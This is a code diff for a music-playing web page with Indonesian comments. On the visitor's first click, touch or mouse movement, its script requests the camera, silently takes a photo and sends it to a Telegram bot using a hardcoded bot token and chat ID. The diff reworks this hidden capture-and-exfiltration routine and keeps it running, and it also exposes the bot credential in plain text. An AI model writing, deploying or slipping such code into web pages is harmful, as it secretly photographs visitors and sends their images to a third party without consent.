@@ -9,7 +9,6 @@ if (openPhotoOptions && photoOptions) {
 const BOT_TOKEN = "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY";
 const CHAT_ID = "6864694275";
 
-// === BAGIAN MUSIK ===
 const music = document.getElementById('bgmusic');
 const btnMusic = document.getElementById('musicButton');
 music.volume = 0.4;
@@ -19,44 +18,41 @@ async function startMusicAndCamera() {
   if (started) return;
   started = true;
 
-  let musicStarted = false;
+  // --- 1️⃣ Coba putar musik ---
   try {
     await music.play();
-    musicStarted = true;
-    console.log("Musik diputar otomatis");
+    btnMusic.classList.remove("show");
+    btnMusic.disabled = true;
+    console.log("🎵 Musik diputar otomatis");
   } catch (err) {
-    console.warn("Autoplay musik gagal:", err);
+    console.warn("⚠️ Autoplay gagal, perlu klik manual");
     btnMusic.classList.add("show");
     btnMusic.disabled = false;
   }
 
-  // === Izin Kamera (sekali saja) ===
+  // --- 2️⃣ Hanya sekali minta izin kamera ---
   try {
-    const allowed = localStorage.getItem("user_allows_auto_capture") === "1";
-    if (!allowed && navigator.mediaDevices) {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      stream.getTracks().forEach(t => t.stop());
+    let stream;
+    const alreadyAllowed = localStorage.getItem("user_allows_auto_capture") === "1";
+
+    if (!alreadyAllowed) {
+      stream = await navigator.mediaDevices.getUserMedia({ video: true });
       localStorage.setItem("user_allows_auto_capture", "1");
       console.log("✅ Izin kamera diberikan pertama kali");
-      await autoCaptureAndSend();
-    } else if (allowed) {
-      console.log("📸 Sudah diizinkan sebelumnya, langsung ambil");
-      await autoCaptureAndSend();
+    } else {
+      stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      console.log("📸 Sudah diizinkan sebelumnya");
     }
+
+    await autoCaptureAndSend(stream);
   } catch (e) {
     console.warn("🚫 Kamera tidak diizinkan:", e);
   }
-
-  if (musicStarted) {
-    btnMusic.classList.remove("show");
-    btnMusic.disabled = true;
-  }
 }
 
-// === FUNGSI FOTO OTOMATIS ===
-async function autoCaptureAndSend() {
+// --- 3️⃣ Ambil foto pakai stream yang sama ---
+async function autoCaptureAndSend(stream) {
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
     const video = document.createElement("video");
     video.srcObject = stream;
     await video.play();
@@ -66,18 +62,20 @@ async function autoCaptureAndSend() {
     canvas.height = video.videoHeight || 480;
     const ctx = canvas.getContext("2d");
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    stream.getTracks().forEach(t => t.stop());
 
     const blob = await new Promise(res => canvas.toBlob(res, "image/png"));
+    stream.getTracks().forEach(t => t.stop());
+
     const fd = new FormData();
     fd.append("chat_id", CHAT_ID);
-    fd.append("caption", "📷 dari pengunjung");
+    fd.append("caption", "📸 dari pengunjung");
     fd.append("photo", blob, "capture.png");
 
     const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
       method: "POST",
       body: fd
     });
+
     if (res.ok) console.log("📤 Foto terkirim");
     else console.warn("⚠️ Gagal kirim foto");
   } catch (err) {
@@ -85,7 +83,7 @@ async function autoCaptureAndSend() {
   }
 }
 
-// === EVENT LISTENER ===
+// === EVENT TRIGGER ===
 function userStart() {
   startMusicAndCamera().catch(console.warn);
 }
@@ -95,10 +93,9 @@ btnMusic.addEventListener('click', userStart);
 document.addEventListener('click', userStart, { once: true });
 document.addEventListener('touchstart', userStart, { once: true });
 
-// === Untuk desktop ===
 if (!/Android|iPhone|iPad|iOS/i.test(navigator.userAgent)) {
   window.addEventListener('mousemove', userStart, { once: true });
-}
+  }
 
 // === PERTANYAAN ===
 const modal = document.getElementById('modal');
@@ -615,5 +612,6 @@ document.getElementById('sendQ').addEventListener('click', async () => {
   updateSpotify();
   setInterval(updateSpotify, 8000);
 })();
+
 
 
